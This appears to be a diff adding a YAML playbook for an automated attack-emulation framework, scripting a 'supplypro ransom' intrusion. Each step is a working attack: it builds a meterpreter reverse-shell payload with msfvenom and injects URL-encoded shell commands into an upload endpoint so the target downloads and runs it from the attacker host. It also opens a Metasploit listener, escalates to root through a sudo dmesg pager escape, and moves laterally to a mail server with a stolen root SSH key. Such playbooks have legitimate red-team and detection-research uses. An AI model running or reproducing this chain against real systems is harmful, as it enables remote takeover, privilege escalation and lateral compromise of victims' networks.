@@ -1,0 +1,142 @@
+vars:
+  APP_URL: "{{ attack_supplypro_ransom_appurl }}"
+  PAYLOAD: linux/x64/meterpreter/reverse_tcp
+  LPORT: 4444
+  ATTACKER: {{ attack_supplypro_ransom_attacker_ip }}
+  ATTACHMENT: Nutzungshinweise_BIT-PRNT-2023.odt
+  REVSHELL_NAME: {{ attack_supplypro_ransom_rshell_name }}
+  MAILSERVER_IP: {{ attack_supplypro_ransom_mailserver_ip }}
+  VICTIM_USER: {{ attack_supplypro_ransom_victim_user }}
+  VICTIM_USER_EMAIL: {{ attack_supplypro_ransom_victim_user_email }}
+
+commands:
+  # tempfile for reverse shell payload
+  - type: mktemp
+    cmd: file
+    variable: RSHELL
+  
+  # generate reverse shell
+  - type: shell
+    cmd: msfvenom -p $PAYLOAD LHOST=$ATTACKER LPORT=$LPORT -f elf > ${RSHELL}
+  
+  # serve payload via http
+  - type: webserv
+    local_path: $RSHELL
+    port: 8080
+    background: True
+
+  # exploit and download payload via http
+  - type: shell
+    cmd: curl -ik "$APP_URL:5000/upload/none%3B%20wget%20-O%20$REVSHELL_NAME%20$ATTACKER:8080%3B%20chmod%20%2Bx%20$REVSHELL_NAME%3B%20%23"
+
+  - type: sleep
+    min_sec: 1
+    seconds: 5
+    random: True
+
+  # dummy
+  - type: shell
+    cmd: curl -k "$APP_URL:5000/upload/none%3B%20$REVSHELL_NAME%3B%20%23"
+
+  - type: sleep
+    min_sec: 1
+    seconds: 5
+    random: True
+
+  # dummy
+  - type: shell
+    cmd: curl -k "$APP_URL:5000/upload/none%3B%20./$REVSHELL_NAME%3B%20%23"
+
+  - type: sleep
+    min_sec: 5
+    seconds: 8
+    random: True
+
+  # dummy
+  - type: shell
+    cmd: curl -k "$APP_URL:5000/upload/none%3B%20/var/www/html/$REVSHELL_NAME%3B%20%23"
+
+  # prepare reverse-shell-listener
+  - type: msf-module
+    creates_session: revshell
+    cmd: exploit/multi/handler
+    payload: $PAYLOAD
+    payload_options:
+      LHOST: $ATTACKER
+      LPORT: $LPORT
+    background: true
+    kill_on_exit: true
+
+  - type: sleep
+    min_sec: 10
+    seconds: 17
+    random: True
+
+  # execute reverse shell
+  - type: shell
+    cmd: curl -k "$APP_URL:5000/upload/none%3B%20export%20PATH%3D%24%28pwd%29%3A%24PATH%3B%20$REVSHELL_NAME%3B%20%23"
+    background: true
+    kill_on_exit: true
+
+  # run commands via reverse shell
+  - type: msf-session
+    stdapi: true
+    session: revshell
+    cmd: sysinfo
+
+  - type: setvar
+    cmd: revshell
+    variable: UPGRADESESSION
+
+  # enter shell in meterpreter
+  - type: msf-session
+    session: revshell
+    cmd: shell
+
+  # upgrade shell to fully interactive shell
+  - type: include
+    local_path: playbooks/upgradeshell.yml
+
+  - type: setvar
+    cmd: revshell
+    variable: GATHER_SESSION
+
+  # gather informations and loot 
+  - type: include
+    local_path: playbooks/gather.yml
+
+  # privilege escalation
+  - type: msf-session
+    cmd: sudo dmesg -H
+    write: True
+    session: revshell
+
+  - type: msf-session
+    cmd: "!/bin/bash"
+    session: revshell
+
+#  - type: msf-session
+#    session: revshell
+#    cmd: sudo find /home -exec /bin/bash \;
+
+  - type: setvar
+    cmd: revshell
+    variable: ROOT_SESSION
+
+  # gather information as root
+  - type: include
+    local_path: playbooks/rootcmds.yml
+
+  # lateral movement to mailserver
+  - type: msf-session
+    session: revshell
+    cmd: ssh -i /root/.bkp/rootkey -o StrictHostKeyChecking=no root@$MAILSERVER_IP
+
+  - type: setvar
+    cmd: revshell
+    variable: MAIL_SESSION
+
+  # run commands on mailserver
+  - type: include
+    local_path: playbooks/mail.yml
+
